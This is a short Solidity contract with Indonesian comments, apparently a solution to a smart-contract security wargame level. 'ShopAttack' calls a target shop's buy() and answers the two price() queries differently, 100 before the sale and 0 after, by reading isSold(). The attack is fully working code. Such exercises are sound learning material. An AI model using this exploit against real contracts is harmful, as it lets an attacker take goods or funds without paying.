// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Definisi interface target agar kita bisa membaca variabelnya
interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttack {
    IShop public target;

    // Fungsi ini dipanggil 2 kali oleh Shop
    // Kita buat dia menjadi fungsi 'view' sesuai permintaan interface
    function price() external view returns (uint256) {
        // Kita intip status 'isSold' di toko
        bool sold = target.isSold();

        // Panggilan 1 (Belum terjual): Kembalikan 100 agar boleh masuk
        if (!sold) {
            return 100;
        } 
        // Panggilan 2 (Sudah terjual): Kembalikan 0 agar harganya jatuh
        else {
            return 0;
        }
    }

    function attack(address _targetAddr) public {
        target = IShop(_targetAddr);
        // Memulai pembelian
        target.buy();
    }
}